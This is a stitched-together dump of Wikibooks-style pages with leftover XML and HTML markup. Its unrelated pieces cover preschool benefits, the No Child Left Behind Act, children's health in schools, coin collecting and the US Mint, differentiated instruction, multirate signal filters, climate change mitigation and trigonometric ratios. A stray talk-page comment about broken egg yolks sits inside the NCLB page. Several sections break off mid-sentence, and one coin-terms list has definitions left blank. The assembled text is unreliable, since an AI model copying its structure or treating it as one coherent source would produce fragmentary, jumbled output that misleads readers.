Research studies have found there are many benefits to providing quality preschool education programs to children.  Children grow and develop many skills during their first five years of their life and providing them with a quality education can not only help their short-term development but it can provide long-term benefits as well.  When children participate in quality education programs they are able to develop academically, socially, emotionally and strengthen their motor skills.  They become better prepared for school as they are already learning how to read and write.  They also learn to work with others and understand the way a classroom works.  In the future children who attend preschool programs are less likely to be held back and require special education class.   They are also more likely to graduate from high school, attend a four year college and find a job.  Because of their education and ability to find a job, they are able to make more money and provide a good future for their kids.  Research has also shown that children who participated in preschool programs are less likely to need welfare, commit crimes and be involved in the juvenile justice system.  Not only do these programs benefit the children involved, they benefit their parents, future children and the community around them.

      <text xml:space="preserve">==No Child Left Behind==

Shanica Smith




==Overview==

The No Child Left Behind (NCLB) Act of 2001 is federal legislation passed in 2001 aimed at having all public school children performing at grade level in reading and mathematics by 2014.  This sweeping federal legislation requires states to demonstrate progress from year to year in raising the percentage of students who are proficient in reading and mathematics and in narrowing the achievement gap (nclb.com, 2007).  NCLB requires states to align test with state academic standards and begin testing students on an annual basis in reading and mathematics in grade 3-8 and at least once during grades 10-12 by the 2005-2006 school year.  It requires the National Assessment of Educational Progress (NAEP) reading and mathematics tests to be administered to a sample of 4th and 8th graders in each state every other year in order to make cross state comparisons.  Schools were at least 35% of the children in the school attendance area are low-income families or at least 35% of the enrolled students are from low-income families are eligible to receive federal Title 1 funds.  The proportion of low-income families is most frequently measured by the percent of students eligible to receive free and reduced price lunch.  Title 1 funds are to be used for programs designed to improve the academic achievement of children from low-income homes.  Over half of all public schools receive funding under Title 1.  

==Parental Choice==

&lt;table WIDTH=&quot;60%&quot; ALIGN=&quot;right&quot;&gt;&lt;tr&gt;&lt;td style=&quot;background-color: #FFF7F7;
border: solid 1px #FFBDBD; padding: 1em;&quot; valign=top&gt;

President George W. Bush stated the “Parents must be given real options in the face of failure in order to make sure reform is meaningful.”  
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

Under NCLB, students in low performing schools are to be able to seek other educational opportunities.  Public schools that fail to make Adequate Yearly Progress (AYP) over time must offer students the option to transfer to a better public school or choose an after-school tutoring program.


==School Safety==

All children need a safe environment in which to learn and achieve.  Too many schools in America remain unsafe, too many teachers are threatened by violence, and too many children fear for their safety.  NCLB encourages laws on the books to be aggressively enforced.  America has learned a lesson since September 11th.  We must prepare for the worst, which is working with communities, so every level of government is looking our for child safety.  NCLB requires states to report on school safety to the public.  NCLB also protects teachers so they can teach and maintain order.  It protects them from frivolous litigation when they take reasonable actions to maintain order and discipline in the classroom.  NCLB provides a mechanism for students to leave chronically dangerous schools.  It requires schools to implement a statewide policy giving students the choice to attend a safe public school within the district if he or she attends a dangerous public school elementary or secondary school, become a victim of a violent crime while in or on the grounds of a public school the students attends.  

==Teacher Quality==

The US Department of Education has reviewed state efforts to meet the Highly Qualified Teacher (HQT) requirement and has notified each state of the results of the assessment of the states HQT progress.  To become a HQT in Core Academics Subjects, you must satisfy three requirements:  a bachelor’s degree or higher degree from an accredited or approved institution, have a valid full state certificate and a subject matter competency for each core academic subject assigned.

==Adequate Yearly Progress (AYP)==

Adequate Yearly Progress (AYP) measures yearly progress towards achieving state academic standards for each student group in a school in reading and math.  Student group categories are:  the school as a whole, white, black, Hispanic, native American, Asian/pacific islander, multicultural, economically disadvantaged, limited English proficient students, and students with disabilities.  Schools must test at least 95% of students in each subgroup.  Forty students or more within a category in a school comprise a subgroup.  All students’ scores are counted in the school wide average, whether or not the student is counted in a subgroup.  If one student group in one subject at a school that does not perform at a target goal percentage, the school is considered to have not made AYP for that year.  Title 1 schools that have not made AYP for two consecutive years enter School Improvement Status and must offer public school choice beginning no later than the first day of school in the next year, and throughout the entire time they are in School Improvement Status.  Title 1 school improvement schools exit that status only after they have made AYP for two consecutive years.  Schools considered persistently dangerous must offer public school choice.  Each state defines what constitutes a “persistently dangerous” school.  State receiving funds under NCLB must allow students who attend such schools, or who are the victim of a violent crime while on the grounds of the school they attend, to transfer to a safe public elementary or secondary school, including a public charter school in the same district.

==Essay Question==

Which schools must offer public school choice?  How long are students allowed to attend the school of their choice?
 
Essay Question Answer

Title 1 schools that have not made Adequate Yearly Progress for two consecutive years enter School Improvement status and must offer public school choice beginning no later than the first day of school in the next year, and throughout the entire time they are in School Improvement status.  Title 1 School Improvement schools exit that status only after they make AYP for two consecutive years.  Schools considered persistently dangerous must offer public school choice.  If a student exercises the option to transfer to another public school, the school district must permit the student to remain in that school until he or she has completed the highest grade in the school.  The school district is no longer obligated to provide transportation for the student after the end of the school year in which the students’ original school is no longer identified for School Improvement.  If the new school is placed in improvement status, the student would have the option to move again to another school in a subsequent year.

:Some people just like hyperbole.

Well, when cooking for children, or for the very fussy, its quite possible to see a breakfast meal rejected for something like a broken yoke. But maybe that's only so in the UK. But also allow for a little hyperbole for entertainment value! ([[User:20040302|20040302]] ([[User talk:20040302|talk]]) 22:12, 11 June 2008 (UTC))</text>

      <text xml:space="preserve">=='''School Role in Early Childhood Health'''==

Keiara Bowser

=='''Introduction'''==

Leonard A. Scheele, a former surgeon general, stated, “The strength of any nation depends upon the physical and emotional health of its children.”  It is estimated that children between the ages of two and five spend about 25 ½ hours a week watching television (Pica).  Some studies also show that approximately 50 percent of American children do not get enough exercise (Pica).  Sadly enough, the number of overweight children has doubled in the last decade (Pica).  Fit children are more likely to participate in sports, dance, games, and other physical activities that improve muscular strength, flexibility, and body composition (Pica).

Despite the horrible statistics, children who are physically active and experience success in movement activities show higher levels of self-esteem and a greater sense of accomplishment (Pica).  Physical activity is important because children are less fatigue and more alert while at school.


=='''Role of Schools'''==

What is a schools role in early childhood health?  The health of children, while they are in school and out, is a matter of universal concern (Scheele, 1948).  Because school age children comprise approximately one fifth of the total population, schools are in a strategic position to influence the health of children (Scheele, 1948).  A child’s experiences at school more than likely will have a tremendous impact on his or her future health.  Teachers and administrators must become advocates for children’s health.  Health concepts can be taught by schools; however, they may have little to no effect on students if no outside assistance is provided by the child’s community.
	
The success of a school’s health-education program relies on the help of health resources from the community.  Some of these resources are food nutritionists and state funded programs like Women, Infants, and Children (WIC).  Many children count on and obtain as much as 50% of the protective foods they need for optimum nutrition in the meals served at school lunch (Scheele, 1948).  Therefore, it is import that schools provide a well-balanced nutritional lunch for all students.


=='''Parental Responsibility'''==

What responsibilities do parents have in regards to their child’s health?  Despite the fact that children spend more awake hours at school than at home, parents are key to developing a home environment that fosters healthful eating and physical activities (Gortmaker, 2006).  Parents have the most control when it comes to shaping their children’s dietary practices, physical activities, weight status, and sedentary behaviors (Gortmaker, 2006).  
Parents should make themselves aware of the social contexts in which foods are consumed.  Studies have found that children prefer foods offered in positive contexts in comparison to negative contexts (Gortmaker, 2006).  Parents should also provide their children with food choices, instead of demanding that the child eats certain foods.

In our society, the chief responsibility for children’s’ health rests with their parents (Wagner, 1961).  In addition, all children need comprehensive medical examinations (Scheele, 1948).  These examinations include but are not limited to:  dental,

“A healthy child grows and develops with greater ease.  Our children have a right to comprehensive health care that includes prevention, early detection, and intervention.”

vision, and hearing examinations.  Moreover, parents are responsible for ensuring that their children receive the proper immunizations against infectious diseases.  Many of these immunizations are needed before a child enters Kindergarten.  

=='''What Can Be Done'''==

For starters, the key to physical activity in early childhood is enjoyment (Pica).  For decades, early childhood teachers have created specialized learning areas within the classroom to enhance the cognitive, social, and emotional development of their students (Gammal).  Unfortunately, many teachers have not created areas within the classroom to enhance and focus on a child’s physical development (Gammal).    Fitness activities at school can be incorporated into both free play and structured programs (Gammal). 
 
During free play activities, children can be able to choose or make up activities using their bodies and equipment provided in the classroom.  Some suggested games for free play are hop-scotch, walking on a balance beam, and long-jumping.  During structured play, the teacher guides students in an activity chosen by the instructor.


=='''Conclusion'''==


The future of national health depends upon what we do now to improve and maintain the health of our children.  It is essential that every child receives health services.  We must also remember that parents play a vital role, at home, in preventing childhood obesity.  It is a parent’s responsibility to discourage sedentary behaviors like watching television and encourage physical activities like swimming and running.

We need to know more about the total health of school-age children before we can improve the role of the school in helping to maintain a child’s health (Wagner, 1961).  Nevertheless, schools can make a difference in the health of a child by promoting and emphasizing the importance of nutrition and daily exercise.

=='''Essay Question'''==

'''Q:  Why should physical fitness be a concern during the early childhood years?'''

	Physical fitness should be a concern during the early childhood years for several reasons.  First, if children are not taught how to and the importance of living a healthy life, they will live unhealthy lifestyles as adults.  These unhealthy lifestyles include: over-eating, binge eating, starvation (to lose weight or keep it off), and not working out.   Second, when a person lives an unhealthy life, the lifestyle can be passed on from generation to generation.  This factor leads to obese and overweight families.

	Lastly, teaching children the importance of living healthy can prevent children from developing high blood pressure, having a heart attack or stroke, and heart disease.  All of these factors can be fatal to anyone.  When teachers and parents stress the importance of engaging in physical activity early on, children will not have to experience any of the above because they will be physically fit.  Hopefully, children will continue to stay active as they move into early adulthood and on to late adulthood.  These are just a few reasons why physical fitness should be a concern during the early childhood years.

==1. Relate briefly the story of barter, showing three reasons why money came into being and naming at least ten strange forms of money used in place of coins or currency. ==
'''Barter:''' as a dictionary puts it, ''barter'' is the exchange of something you own for something else that someone else owned. For example, if I raised chickens, and you grew apples, and I wanted some apples and you wanted a chicken, we would come to an agreement to exchange my chicken(s) for your apple(s).

After a while, I had enough of apples, and wanted something else. My other neighbor was vegetarian, and grew corn, but he did not want chickens. I found out that he also liked apples, so I ''bartered'' my chickens for your apples, and then traded the apples I got for my neighbor's corn. In a clumsy way, the apples were a '''[[W:Medium_of_exchange|medium of exchange]]''', because they allowed me to trade for what I wanted. Unfortunately, you did not always want chickens, and apples were not always in season, so there were times in the year that I could not trade.

Simply put, a ''medium of exchange'' is a substitute used in trade to avoid the inconvenience of the barter system. This allowed the value of your apples, the corn, and my chickens to be valued differently. For example, I did not believe that I should only get one apple for one chicken. The chicken is bigger than an apple. Perhaps the first ''medium of exchange'' were stones. I would trade my chicken for four stones, and you would trade your apples for one stone, and the corn would be traded for two stones. 

Very soon, we decided stones would not be a good ''medium of exchange'', because:
# it was not very portable
# it could not be easily divided
# it was heavier than it was worth
# sometimes we could not recognize it
# and the neighbor's kid found a rockpile on the other side of the stream

Fast forward a few years, and '''[[W:Currency|currency]]''' has now been developed. ''Currency'' is a unit of exchange, which allows goods and services to be exchanged. It is one form of money (where money is anything that serves as a medium of exchange, a store of value, and a standard of value).

===United States Mint===
The '''[[W:US_Mint|United States Mint]]''' primarily produces circulating coinage for the United States to conduct its trade and commerce. The main Mint facility is located in Philadelphia, Pennsylvania, and branch facilities are located in Denver, Colorado, San Francisco, California, and West Point, New York.

'''[[W:Mint_mark|Mint marks]]''' in United States coinage include:
* P for the Philadelphia Mint,
* D for the Denver Mint,
* S for the San Francisco Mint,
* W for the West Point Mint,
* CC for the Carson City Mint,
* C for the Charlotte Mint, and
* O for the New Orleans Mint. 
Most coins of the Philadelphia Mint earlier than 1980 are unmarked.

====Current Facilities====
The Mint's largest facility is the Philadelphia Mint, one of four active coin-producing mints. The current facility at Philadelphia, which opened in 1969, is the fourth Philadelphia Mint. The first was built in 1792, when Philadelphia was still the U.S. capital, and began operation in 1793. Until 1980, coins minted at Philadelphia bore no mint mark, with the exceptions of the Susan B. Anthony dollar and the wartime Jefferson nickel. In 1980, the P mint mark was added to all U.S. coinage except the penny. Until 1968, the Philadelphia Mint was responsible for nearly all official proof coinage. Philadelphia is also the site of master die production for U.S. coinage, and the engraving and design departments of the Mint are also located there.

The Denver branch began life in 1863 as the local assay office, just five years after gold was discovered in the area. By the turn of the century, the office was bringing in over $5 million in annual gold and silver deposits, and in 1906, the Mint opened its new Denver branch. Denver uses a D mint mark, and strikes coinage only for circulation. It also produces its own working dies ,as well as working dies for the other Mints.

The San Francisco branch, opened in 1854 to serve the goldfields of the California Gold Rush, uses an S mint mark. It quickly outgrew its first building and moved into a new facility in 1874. This building, one of the few that survived the great earthquake of 1906, served until 1937, when the present facility was opened. It was closed in 1955, then reopened a decade later during the coin shortage of the mid-60s. In 1968, it took over most proof-coinage production from Philadelphia, and since 1975, it has been used solely for proof coinage, with the exception of the Anthony dollar and a portion of the mintage of cents in the early 1980s. (These cents are indistinguishable from those minted at Philadelphia.)

The West Point branch is the newest branch mint. Its predecessor, the West Point Bullion Depository, was opened in 1937, and cents were produced there from 1973 to 1986. The West Point Mint gained official status as a branch mint on March 31, 1988. Along with the cents already mentioned, which were identical to those produced at Philadelphia, West Point has struck a great deal of commemorative and proof coinage bearing the W mint mark. In 1996, West Point produced clad dimes, but for collectors, not for circulation. The West Point facility is still used for storage of part of the United States' gold bullion reserves, and West Point is now the United States' only production facility for gold, silver and platinum American Eagle coins.

The Mint is not responsible for the production of paper money; that is the responsibility of the '''[[W:Bureau_of_Engraving_and_Printing|Bureau of Engraving and Printing]]'''.

===Bureau of Engraving and Printing===
[[image:BureauEngravingPrintingSeal.jpeg|right|Seal of the Bureau of Engraving and Printing]]
The '''[[W:Bureau_of_Engraving_and_Printing|Bureau of Engraving and Printing]]''' ('''BEP''') is an government agency in the United States Department of the Treasury that primarily prints Federal Reserve notes for the Federal Reserve, but also produces a variety of other government security documents.

The Federal Reserve notes are printed at the bureau's facilities in Washington, D.C. and Fort Worth, Texas. The BEP produces other government products such as postage stamps for the United States Postal Service, hand engraved invitations on behalf of the White House, Treasury securities, identification cards, and naturalization certificates. The BEP does not produce any U.S. coins; that is the responsibility of the United States Mint. The Fort Worth facility was opened officially on April 26, 1991.

The BEP had its foundations in 1861 with workers signing, separating, and trimming sheets of Demand Notes in the Treasury building. In 1877, the Bureau became the sole producer of all United States bills and notes. 

===Coin Composition===
In 1792, law was enacted which said that American money was to be made of gold, silver, and copper for the $10, $5, and $2.50 coins. The $1, half-dollar, quarter, dime, and half-dime were made of silver. The 1-cent and half-cent were made of copper.

During the Great Depression, the mint stopped producing gold coins (1933). In 1964 a silver crisis caused the replacement of silver in the quarter and dime, but the half-dollar's silver content was reduced from 90 per cent to 40 per cent silver from 1965 to 1970. Today, these coins are composed of cupro-nickel clad, with a pure copper core, and an outer layer of a 75 per cent copper, 25 per cent nickel alloy.

Nickels are also made from the 75-25 alloy, and the cent which was a copper coin, is now composed of copper plated zinc. The cents are less expensive to manufacture, and weighs 2.5 grams and is about 20 percent less than cent coins previously minted with 95 percent copper and 5 percent zinc, which weighed 3.11 grams. The composition of the cent was changed in 1982, and cents, and both copper and copper-plated zinc cents were produced in that year.

==3. Explain how money is distributed in your country. ==

* [http://www.frbatlanta.org/invoke_brochure.cfm?objectid=83FD41E6-9AF0-11D5-898400508BB89A83&amp;method=display_body Circulation of Money]

Coin and currency are put into circulation by ''your'' banks (depository institution). These banks obtain the coins and currency from the Federal Reserve Banks. The Federal Reserve, the Bureau of Engraving and Printing (BEP), and the U.S. Mint do not release coins and currency direct to the public.
&lt;br style=&quot;clear:both&quot;&gt;

==4. Define any of the following terms as they may apply to your country’s monetary system: ==
;a. Alloy: An alloy is a combination of two or more elements, at least one of which is a metal, and where the resulting material has metallic properties. The resulting metallic substance usually has different properties (sometimes significantly different) from those of its components.  Nearly all coins are made of alloys.
;b. Cast Coins: Coins which are made by pouring a molten alloy into a mold.
;c. Clad Coinage: Coins made of layers, like a metal sandwich. Since the removal of silver from US dimes, quarters, half-dollars and dollars, these coins (except the smaller dollars) have been made of clad layers of nickel on the outside and copper on the inside. Look at the edge of the coins to understand. 
;d. Commemorative: Commemorative coins are legally issued coins with a design intended to commemorate or draw attention to some event or person. They are so called to distinguish them from regular issue coinage. 
;e.Die: An engraved tool used for stamping a design onto a coin.  
;f. Field: The field is the background—the part of the coin that shows no picture or words.
;g. Inscription: An inscription is any letter, word, or phrase pressed into the surface of a coin.
;h. Lettered Edge: A coins having letters written on its edge. 
;i. Obverse: The front side of currency or a coin (often called &quot;heads&quot; on a coin).
;j. Reeded Edge: The reeded edges still found on many coins (always those that were once made of gold or silver, even if not so now) were originally designed to show that none of the valuable metal had been shaved off the coin.  These show up as ridges along the edge of the coin.  
;k. Reverse:  The back side of currency or a coin (often called &quot;tails&quot; on a coin).
;l. Series: A particular design or motif used over a period of time. This can used for a single denomination, or in some cases, used for several denominations. The Liberty Seated series encompasses five denominations, the Barber series three, etc. 
;m. Overprint
;n. Counterfeit proofing
;o. Magnetic strip
;p. Florescent ink
;q. Inflation controls

==6. Know how coins are graded in quality by collectors. ==

Grading coins is an art that requires some skill. Anyone with some practice can get a fairly good idea as to the neighborhood of the grade of a coin. It's important to know the grade of a coin because, in general, the higher the grade of a coin, the higher its value.

United States coins are usually graded on a 70 point scale that was devised by Dr. William Shelby. 0 means that you can probably tell that it was once a coin, while 70 means that it is perfect. Some people, such as unscrupulous coin sellers, may overgrade coins so that they can sell them for more money than they are actually worth. 

If you don't know how to grade coins, you should not buy coins without help. If you do not know how to grade coins for yourself, you will eventually learn, but the process could be expensive. Selling coins does not present as much of a problem. Just take the coins you want to sell to several different dealers to get their opinions as to the grade. Always ask for the grade opinion before asking for a price, as it can help in negotiating a fair price. 

If you are interested in learning to grade coins yourself, you may want to start with the book titled &quot;Official A.N.A. Grading Standards for United States Coins&quot; published by the ANA.

==7. Have a coin or notes from 10 different countries. Describe what is on each, give the names of any people or objects portrayed on them, and give the dates for them whenever possible.==

==8. Do one of the following: ==
===a.  Collect at least five coins or notes from your country that are no longer in circulation.===
===b. Collect a date series of coins from your country beginning with your birth year (expensive and rare coins need not be included)..===

===c. Collect and mount a type set of coins from your country minted during the 20th Century.===
A type set is generally defined as a collection that contains one, and only one, of each design for a series or complete coinage series.  This &quot;type set&quot; collection will need to show all the designs of U.S. coinage minted from 1901 to 2000, and will be very difficult and costly to assemble.

'''Notes:'''
# Washington Quarters were made of 90% silver up to and including 1964. You are competing with 'silver collectors' who collect these coins for their 'raw metal' value, which can be up to ten times the face value of the coin - $2.50 for a 25-cent quarter. See http://coinflation.com
# Roosevelt dimes were made of 90% silver up to and including 1964.
# The 1964 Kennedy half-dollar is also 90% silver. The Franklin half-dollar(s) before that were also 90% silver.
# There is no Washington Quarter with a 1975 date. For 1975 and 1976, the US Mint stamped out the Bicentennial Quarter design which showed a date '1776 - 1976'. Unless you have a proof set that shows that it was released specifically in 1975 and 1976, you cannot tell the difference in the circulated coins.
# Nickels minted from 1942-1945 during World War II contain 1.75 g (0.05626 oz) silver. The silver content of these &quot;war nickels&quot; as of October, 2007 is worth $0.77.
# As of October 2007, the value of the metal in the nickel coin has reached 6.8 cents, a 36% premium over its face value, due to the rising costs of copper and nickel against a falling U.S. Dollar. In an attempt to avoid losing large quantities of circulating nickels to melting, the United States Mint introduced new interim rules on December 14, 2006 criminalizing the melting and export of pennies and nickels. Violators of these rules can be punished with a fine of up to $10,000, five years imprisonment, or both.

* The [[w:Coinage Act of 1965|Coinage Act of 1965]], Pub.L. 89-81, 79 Stat. 254, enacted 1965-07-23, eliminated silver from the circulating dimes and quarter dollars of the United States, and diminished the silver content of the half dollar from 90% to 40%. This act was in response to coin shortages caused by the rising price of silver.

== A model to consider ==

One model to consider in the evolution of the WikiBooks project is the [[w:NCBI bookshelf|NCBI bookshelf]].  This is a series of textbooks and biology authoritative references that have been made accessible to the public through the auspices of the United States National Library of Medicine.  A key point of the access is the cross-referencing between biomedical research abstracts and the topics in the books, which provides a model where the books serve as a knowledge framework and summary to assist in the organization and exploration of the growing body of biomedical literature.  It is conceivable that a similar relationship could be fostered between WikiBooks and Wikipedia. [[User:Ceyockey|Courtland]] 18:15, 5 August 2005 (UTC)</text>

==Definition==

Differentiated instruction is a teaching approach that assumes there is a diversity of learners in every classroom and that all of those learners can be reached using different techniques and materials according to each student's ability (Bowers 2006).  This approach increases learning for all students, regardless of academic skill level or background.  Using differentiated instruction, educators adapt content, process, and product according to student readiness, interest, and learning profile.  “When a teacher differentiates instruction, he or she uses the best teaching practices and strategies to create different pathways that respond to the needs of diverse learners” (Staff Development for Educators 2006).  Fundamentally, differentiation is the effort teachers apply to respond to the diversity among learners within their classrooms. Teachers can differentiate instruction with an individual student, within a small group, or with a whole class. Contrary to what many people think, differentiating instruction does not mean that teachers provide separate, unrelated activities for each student but does mean they provide interrelated activities that are based on individual student needs for the purpose of ensuring that all students come to a similar grasp of a skill or idea (Learning Point Associates 2007).  Unlike individualized instruction, where teachers focus on the specific needs and skills of each individual student, differentiated instruction concentrates on the needs of student clusters (Starr 2004).  

==Importance==
In a typical classroom, students vary in their academic abilities, learning styles, personalities, interests, background knowledge and experiences, and levels of motivation for learning.  If teachers want to maximize their students' individual potential, they will have to attend to these differences.  Carol Tomlinson (2007) asserts that research shows that students are more successful when they are taught based on their own readiness levels, interests, and learning profiles. 

Another reason for differentiating instruction relates to teacher professionalism. Skilled teachers are conscientious about students' diverse learning needs. Differentiated instruction enables teachers to open up learning opportunities for all students by offering varied learning experiences.  It also allows teachers to put best practices into a meaningful context for learning, while adding new instructional strategies to their repertoires. Differentiation also helps teachers to understand and use assessment as a critical tool to drive instruction.  It gives administrators, teachers, and students an instructional management system to more efficiently meet the demands of high stakes testing.  Finally, this approach helps teachers meet curriculum requirements in a meaningful way for achieving students' success (Staff Development for Educators 2006). 


==Implementation==

Differentiation meets students where they are (Holloway 2006).  Learning what students already know about a particular topic is vital for teachers in making instructional plans in a differentiated classroom.  Therefore, in implementing a working differentiation plan into a classroom, a teacher’s first priority is learning what prior knowledge and experiences his or her students posses.  From there, teachers can then differentiate their instruction within several classroom elements based on student readiness, interest, or learning profile.  Four of these classroom elements include: learning environment content, process, and products (Tomlinson 2004). 
Learning Environment 
The learning environment is how a classroom works and feels.  At the elementary level, differentiating within the learning environment involves making sure there are places in the room for students to work quietly and without distraction, as well as places that invite collaboration.  It also means that teachers provide various instructional materials that reflect a variety of cultures and home settings.  In addition, teachers have to remember to set clear guidelines so that independent work matches individual needs, as well as develop routines that allow students to know how or where get help when teachers are busy with other students and cannot help them immediately.  One of the most important factors in creating a differentiated learning environment involves helping students understand that some learners need to move around to learn, while others do better sitting quietly (Tomlinson 2004). 
 
==Content==

Content is the information that students need to learn and how they will gain access to information.  At the elementary level, teachers may differentiate instruction for content through the use of reading materials at varying readability levels. For students with reading problems, teachers may present ideas through both auditory and visual means: they may put text materials on tape or use reading buddies.  In addition, teachers may use spelling or vocabulary lists at the readiness levels of their student clusters. Finally, teachers using the differentiated instruction approach meet with small groups as a method to re-teach an idea or skill for struggling learners, or to extend the thinking or skills of advanced learners (Tomlinson 2004).  

==Process==

The process of learning involves the activities in which students engage in order to make sense of or master the content they are learning.  At the elementary level, differentiating instruction within the process of learning often requires teachers to be creative in their methods of planning and instruction. Most often, differentiating teachers can use tiered activities through which all learners work with the same central understandings and skills, but proceed with different levels of support, challenge, or complexity.  In addition, they offer manipulatives or other hands-on activities for students who need them to facilitate learning. Teachers using differentiating instruction also tend to provide learning centers that encourage students to explore areas of the class topic of particular interest to them. Some teachers also develop personal agendas, task lists written by the teacher, containing both work for the entire class and work that addresses students’ individual needs.  These are completed either during a specific time or as students complete their work if it is early(Tomlinson 2004).  Teachers do often find it necessary to vary the length of time individual students may take to complete an assignment in order to provide additional support for struggling learners or to encourage more advanced learners to pursue a topic of interest in greater depth (Holloway 2006).  

==Products==

The products of learning are the culminating projects that ask students to rehearse, apply, and extend what they have learned while studying a unit. At the elementary level, teachers using differentiation can be creative with this element of learning.  Some teachers may give students options as to how they wish to express required learning; including such options as: creating a puppet show, writing a letter, or developing a mural with labels. Other teachers may choose to use rubrics that match and extend students' diverse skill levels.  Within this approach teachers may choose to allow students to work alone or in small groups on their products, just as they would throughout the process, encouraging students to create their own product assignments as long as the assignments contain specified required elements (Tomlinson 2004).

Differentiating instruction does not mean that teachers provide separate, unrelated activities for each student but does mean they provide interrelated activities that are based on individual student needs for the purpose of ensuring that all students come to a similar grasp of a skill or idea
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

==Additional Resources==

For educators who are interested in utilizing differentiation within their own classrooms, it is both helpful and vital to partner with someone knowledgeable and skilled in this approach.  In addition, there is a great deal of information available on the internet.  Two such resources are: “Preparing Teachers for Differentiated Instruction: What the Research Says” written by John H. Holloway and found on the NEA website, and “How to Differentiate Instruction” which can be found on the Teachnology Tutorials website.  Both of these sites offer insight and research-based ideas for instruction and planning of differentiated lessons.

==Essay Question==


How can the use of differentiated instruction eliminate the necessity of placing students in classes based on academic skill level?

	Differentiated instruction assumes that a typical classroom is made up of students who differ in their academic abilities, learning styles, personalities, interests, background knowledge and experiences, and levels of motivation for learning, and therefore helps teachers to shape student learning based on student readiness, interest, and learning profile.  Within this approach, teachers meet with small groups, or clusters, of students as opposed to a whole group teaching method.  This allows teachers to specifically tailor their instruction based on the needs of each student cluster, thus allowing them to teach the same information to slower students as well as those who are more advanced.  This means they may use it as a method to re-teach an idea or skill for struggling learners, or to extend the thinking or skills of more advanced learners.  In order to accomplish this seemingly difficult task, experienced teachers will design their classrooms to include areas where students may work quietly and without distraction, as well as areas designed for student collaboration.  Skilled in this approach, teachers will present ideas through both auditory and visual means, use reading materials at varying readability levels, and use spelling or vocabulary lists at the readiness levels of the students using them.  They will also make use of tiered activities, offer manipulatives to student clusters who require them, and provide learning centers that encourage students to explore subsets of the unit which are of particular interest to them.  Finally, using differentiation, teachers will be creative with the final products of student learning.  Some students will show their learning in a creative manner, such as a play or puppet show, while others will be given other options.   Through employing these methods, teachers can reach slower learners as well as more advanced learners within the same classroom, thus eliminating the need to place students in classrooms based solely on academic skill level.

== Multirate Filters ==

There are many instances where the rate at which a signal can be processed by a particular component or module is different from the speed at which data enters that module. 

{{TextBox|'''Example: DVD and CD Audio'''

CD audio is encoded at 44.1K samples per second. DVD audio, by comparison, is encoded at 48K samples per second. In order to convert music from one to the other, the sample rate needs to be altered.}}

== Upsampling ==

Upsampling creates more samples in the same amount of time, typically by inserting zero-valued samples between the preexisting samples. At first blush, this may seem like an ill-conceived approach.  However, if one considers that a discrete signal is already zero between the sample points, the approach begins to make more sense.  

==Spectral Effects==
Inserting a single zero between each of the samples will cause the spectrum to replicate and fold, creating a mirror image.  If the original sample rate was &lt;math&gt;f_s&lt;/math&gt;, the new sample rate will be &lt;math&gt;2f_s&lt;/math&gt;, and the spectrum will fold and replicate at &lt;math&gt;\frac{f_s}{2}&lt;/math&gt;.  This image can then be filtered out using a low-pass filter.

Inserting more than one zero between sample points will cause the spectrum to replicate and fold accordion-style.  If ''N'' zeros are inserted, ''N'' images will be created.  Again, these images can be attenuated by applying a low-pass filter.

==Implementation==
Typically, the low-pass filter and the upsampler are implemented as a unit, and the upsampling takes place only ''conceptually''.  Since the zero-valued samples will not contribute to the sum of products in an FIR filter, these multiplications are simply skipped.  Zero times anything is zero.

== Downsampling ==

Downsampling, or '''decimation''' is the process of discarding certain samples so that there are fewer samples in the same amount of time. Once discarded, those samples can never be replaced and error is introduced into the system. However, a downsampled system can also be processed with a slower filter, which is typically less expensive.

=== Spectral Effects ===

Downsampling causes the spectrum to spread. If the spectrum is periodic, there could be some overlapping of spectral objects, and this causes '''aliasing'''.  Aliasing of this sort is typically resolved by passing the downsampled signal through a low-pass filter to help remove the overlapped areas.

== Ideal Reconstructor ==

An ideal reconstructor can be created by having an upsampler followed directly by a downsampler. 

Similarly, if a single is separated, each branch can be delayed and downsampled, and then combined together with zero loss. This enables the signal to be processed at a much slower rate then the input data rate, without losing any data.

== Fractional Decimation ==

Upsampling and downsamping alter the size of the data set by an integer ratio of samples. In order to achieve a fractional sample rate, upsamplers and downsamplers need to be coupled together to change the data rate to a fraction of the input data rate.</text>

      <text xml:space="preserve">In this section, we assume anthropogenic climate change is well underway and examine what individuals and social structures can do to slow or reverse the trend.

It is consensual that at present all strategies to address climate change in a global scale will be extremely infective, not by design but for failure to comply and commit to them, and extremely costly, especially due to the first reason. If measures are not taken simultaneously by all the unbalance will aggravate the impact on those that will attempt to implement them.

==Community contributions to mitigation==
{{TOC right}}
{{wikiversity|Environmental community building}}
This section highlights some current thinking about how communities might deal with a changing climate. These include encouraging people to live closer to where they work, building up (not out), increasing use of public transportation, increasing recycling programs, more efficient use of water resources, more renewable energy sources, and even &quot;green&quot; urban planning.

==How societies/countries can reduce emissions==
{{wikiversity|Juridical national measures on climate change}}
Governments are now aware and intend to take action to reduce greenhouse gas emotions, these are several areas that can contribute to it.

      <text xml:space="preserve">'''Trigonometric ratios''' deals with '''sin''', '''cos''' and '''tan''', which are the three main [[w:Trigonometric function|trigonometric functions]]. Here we define them in two equivalent ways, exploring regions where they are positive and negative, and various [[w:Identity (mathematics)|identities]] (things which are always true) about them.

== Definitions ==
Here we introduce two definitions of the trigonometric ratios. We present the right-angle triangle definition first, because it is conceptually easier to understand, and is more useful in the geometrical and physical applications. However, whereas the first definition is only applicable for angles between 0° and 90°, the second definition is more general, being valid for all angles, including those greater than 360° and those less than 0°.
=== Right-angled triangle ===
[[Image:Trig triangle.png|thumb|288px|Diagram of a right-angled triangle, with adjacent, opposite, and hypotenuse labeled.]]
Consider a right-angled triangle like the one shown here. We choose one of corners (not the right-angle) and name the angle there &lt;math&gt;\theta&lt;/math&gt;. Then, we label the sides, according to whether they are '''opposite''' (it doesn't touch the angle), the '''[[w:Hypotenuse|hypotenuse]]''' or the other '''adjacent''' side. We then define sin, cos and tan to be [[w:Function (mathematics)|function]]s of &lt;math&gt;\theta&lt;/math&gt; (pronounced  and written 'theta') such that
:&lt;math&gt;\begin{align}
   \sin(\theta) &amp; = \frac{\mbox{Opposite}}{\mbox{Hypotenuse}} \\
   \cos(\theta) &amp; = \frac{\mbox{Adjacent}}{\mbox{Hypotenuse}} \\
   \tan(\theta) &amp; = \frac{\sin(\theta)}{\cos(\theta)}=\frac{\mbox{Opposite}}{\mbox{Adjacent}}
\end{align}&lt;/math&gt;
Note that these are functions of &lt;math&gt;\theta&lt;/math&gt;, not just a constant multiplied by &lt;math&gt;\theta&lt;/math&gt;. Also, note that these are used so commonly that we normally omit the parentheses:
